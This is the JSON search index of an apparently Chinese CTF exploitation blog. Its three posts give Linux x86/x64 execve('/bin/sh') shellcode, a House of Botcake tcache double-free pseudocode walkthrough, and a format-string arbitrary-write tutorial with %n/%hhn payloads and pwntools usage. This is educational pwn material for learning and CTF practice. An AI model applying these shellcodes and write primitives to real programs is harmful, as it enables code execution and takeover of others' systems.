{"meta":{"title":"A4x7eq28'Blog","subtitle":"","description":"","author":"A4x7eq28","url":"http://www.4x7.fun","root":"/"},"pages":[{"title":"about","date":"2022-03-18T11:17:15.000Z","updated":"2022-03-18T11:50:55.000Z","comments":true,"path":"about/index.html","permalink":"http://www.4x7.fun/about/index.html","excerpt":"","text":""},{"title":"书单","date":"2022-03-24T02:50:48.000Z","updated":"2022-03-24T02:50:48.000Z","comments":false,"path":"books/index.html","permalink":"http://www.4x7.fun/books/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-03-18T10:31:12.000Z","updated":"2022-03-18T11:07:44.000Z","comments":true,"path":"categories/index.html","permalink":"http://www.4x7.fun/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2022-03-24T02:51:21.000Z","updated":"2022-03-24T02:51:21.000Z","comments":true,"path":"links/index.html","permalink":"http://www.4x7.fun/links/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-03-18T10:31:13.000Z","updated":"2022-03-18T11:07:53.000Z","comments":true,"path":"tags/index.html","permalink":"http://www.4x7.fun/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Shellcode Collection","slug":"shellcode","date":"2022-03-21T12:44:19.000Z","updated":"2022-03-24T12:54:12.000Z","comments":true,"path":"2022/03/21/shellcode/","link":"","permalink":"http://www.4x7.fun/2022/03/21/shellcode/","excerpt":"","text":"32位 有&quot;\\x00&quot;最短 20 byte 12345678910shellcode= &#x27;&#x27;&#x27; xor ecx,ecx mul ecx mov al,0xb push 0x68732f push 0x6e69622f mov ebx,esp int 0x80 &#x27;&#x27;&#x27; shellcode=asm(shellcode) 无&quot;\\x00&quot;最短 21 byte 12345678xor ecx,ecxmul ecxpush eaxmov al,0xbpush 0x68732f2f push 0x6e69622f mov ebx,espint 0x80 标准shellcode 23 byte 123456789xor ecx,ecxxor edx,edxpush edxpush 0x68732f2fpush 0x6e69622fmov ebx,espxor eax,eaxmov al,0xBint 0x80 64位 最短有&quot;\\x00&quot; 22 byte 12345678xor rsi,rsimul esimov rbx,0x68732f6e69622fpush rbxpush rsppop rdimov al, 59syscall 最短无&quot;\\x00&quot; 23 byte 123456789xor rsi,rsimul esipush raxmov rbx,0x68732f2f6e69622fpush rbxpush rsppop rdimov al, 59syscall 标准shellcode 31 byte 12345678910xor rdi,rdixor rsi,rsixor rdx,rdxxor rax,raxpush raxmov rbx,0x68732f2f6e69622fpush rbxmov rdi,rspmov al,0x3bsyscall 转载自: Linux_ShellCode","categories":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"}]},{"title":"HeapAttack: House_of_Botcake","slug":"HeapAttack-House-of-Botcake","date":"2022-03-18T12:16:10.000Z","updated":"2022-03-24T13:06:03.000Z","comments":true,"path":"2022/03/18/HeapAttack-House-of-Botcake/","link":"","permalink":"http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/","excerpt":"","text":"1. 漏洞样式 glibc版本：≥ 2.3.1 Tcache：开启 漏洞要求：double free 2. 利用方法 2.1 攻击效果 绕过Tcache的 tcache-dup 检查，将 可控chunk 插入 Tcache-list,修改 可控chunk 的 fd 字段，从而 最终实现 任意地址写’。 2.2 攻击过程 伪代码表示如下 123456789101112131415161718192021222324252627size = 0x108mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunka = malloc(size) b = malloc(size) #a,b chunk是主角malloc(0x18) #和top_chunk隔离，防止forward-consolidation[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满free(a) #因tcache已满，a、b进unsorted-binfree(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中malloc(size) #一次分配后tcache有一个空位free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlappayload = size * b&quot;\\0&quot; + p64(size) + p64(target_address) #不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fdwrite(c, payload) ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunktarget_memory = malloc(size)write(target_memory, arbitrary_value) 参考： heap_exploit_2.31/house_of_botcake.c","categories":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"tcache","slug":"HeapAttack/tcache","permalink":"http://www.4x7.fun/categories/HeapAttack/tcache/"}],"tags":[{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"House_of_Botcake","slug":"House-of-Botcake","permalink":"http://www.4x7.fun/tags/House-of-Botcake/"},{"name":"tcache","slug":"tcache","permalink":"http://www.4x7.fun/tags/tcache/"}]},{"title":"Format-String Attack","slug":"fmtstr_attack","date":"2022-03-18T03:42:27.000Z","updated":"2022-03-24T12:54:16.000Z","comments":true,"path":"2022/03/18/fmtstr_attack/","link":"","permalink":"http://www.4x7.fun/2022/03/18/fmtstr_attack/","excerpt":"","text":"1. 漏洞样式 通常情况下漏洞程序样式： Table 1. Vulnerable Code Demo 123char buffer[1024];gets(buffer, 1024);printf(buffer); 字符串 buffer 可控且作为 printf 的第一个参数。当其中包含 格式化字符(例如%s, %d, %p等) 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。 2. 利用方法 2.1 确定偏移 输入字符串（即Table 1中buffer）在栈上的偏移，即buffer被printf当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10 步骤1. break printf ；即在 printf 下断点 步骤2. 输入 %p%p%p%p 等特殊字符 步骤3. 在 printf 函数断点，使用 stack 命令查看栈。找到 %p%p%p%p 特殊字符串在栈上的位置。如Figure 1所示。 Figure 1. printf stack illustration 需注意图中①断点在**printf**入口，已跳转到**printf** 但尚未执行**printf**中指令（尤其是栈指令，否则栈布局会改变）；注意图中② **0b** 即字符串 **%p%p%p%p** 距离栈顶( **esp** )的偏移为 **11**；由于在 **esp + 0** 的位置存放函数返回地址。因此 **%p%p%p%p** 字符串实际上位于 ***栈上*** 第 **10** 个参数。 - 步骤4. 根据不同架构确定 **buffer** 在 **printf** 函数参数的序号。参考[**函数调用约定**](https://www.laruence.com/2008/04/01/116.html)。 - a). x86架构 x86架构的函数参数全部通过栈传递， 因此 **buffer** 是 **printf** 的第**10**个参数。 - b). x64架构 x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 **Figure 1** 在x64架构中，**buffer**对应的是**printf**函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，..., 16)。 2.2 实现任意地址写 往 任意目标地址(记为target_address) 中写入 任意值(记为target_value) 。 1). 任意值的控制：通过格式化字符串 %Mc 其中 M=target_value来操控 2). 任意地址的控制：将目标地址(target_address)写入buffer字符串中；并通过格式化字符串 %N$n来指定将 当前printf已经输字符个数 写入到第 N 个参数指定的地址中。其中 N即为’使用2.1中方法确定的‘’在buffer字符串中的‘’target_address在栈上的位置对应的printf的参数序号‘。(该处使用’'分句停顿帮助阅读) 例如： 2.2.1 当target_value 较小时，直接写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位） Table 2. Payload Demo 1 12// 写4到target_addresspayload1 = p32(target_address) + b&#x27;%10$n\\0&#x27; 其中： payload1实现写4(p32为4byte)到target_address Table 3. Payload Demo 2 123payload2 = b&#x27;%13$n&#x27; + b&#x27;%100c&#x27; payload2 = payload2.ljust(12, b&#x27;a&#x27;)payload2 += p32(target_address) payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13 2.2.2 当target_value太大时，分字节写入 假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向target_address 中写入的target_value为***0xbaedbeef***。 实际上就是令： *(int8*)target_address = 0xef = 239 *(int8*)(target_address + 1) = 0xbe = 190 *(int8*)(target_address + 2) = 0xed = 237 *(int8*)(target_address + 3) = 0xba = 186 这种情况下使用 %Nhhn** 向目标地址写入**int8**宽度值 和 使用 **%Nhn 向目标地址写入int16宽度值，将会非常有用。 那么可以使用如下payload实现： Table 4. Payload Demo 3 12345678910111213payload = p32(target_address) //arg10payload += p32(target_address + 1) //arg11payload += p32(target_address + 2) //arg12payload += p32(target_address + 3) //arg13//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239// 186 - 16 = 170payload += b&quot;%170c%13$hhn&quot;// 190 - 186 = 4payload += b&quot;%4c%11$hhn&quot;// 237 - 190 = 47payload += b&quot;%47c%12$hhn&quot;// 239 - 237 = 2payload += b&quot;%2c%10$hhn&quot; 2.2.3 使用pwnlib的fmtstr_payload函数自动构造payload 示例如下： Table 5. Payload Demo 4: fmtstr_payload 12345from pwn import *from pwnlib.util import misc//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)io.send(payload) 2. 注意事项 3. 原理说明 参考： fmtstr_attack on ctf-wiki","categories":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"}]},{"title":"404","slug":"404","date":"2022-02-23T11:48:56.000Z","updated":"2022-03-24T12:50:00.000Z","comments":true,"path":"/404.html","link":"","permalink":"http://www.4x7.fun/404.html","excerpt":"","text":"Page Not Found","categories":[],"tags":[{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}],"categories":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/categories/shellcode/"},{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/categories/HeapAttack/"},{"name":"tcache","slug":"HeapAttack/tcache","permalink":"http://www.4x7.fun/categories/HeapAttack/tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/categories/Format-String/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://www.4x7.fun/tags/shellcode/"},{"name":"HeapAttack","slug":"HeapAttack","permalink":"http://www.4x7.fun/tags/HeapAttack/"},{"name":"House_of_Botcake","slug":"House-of-Botcake","permalink":"http://www.4x7.fun/tags/House-of-Botcake/"},{"name":"tcache","slug":"tcache","permalink":"http://www.4x7.fun/tags/tcache/"},{"name":"Format String","slug":"Format-String","permalink":"http://www.4x7.fun/tags/Format-String/"},{"name":"404","slug":"404","permalink":"http://www.4x7.fun/tags/404/"}]}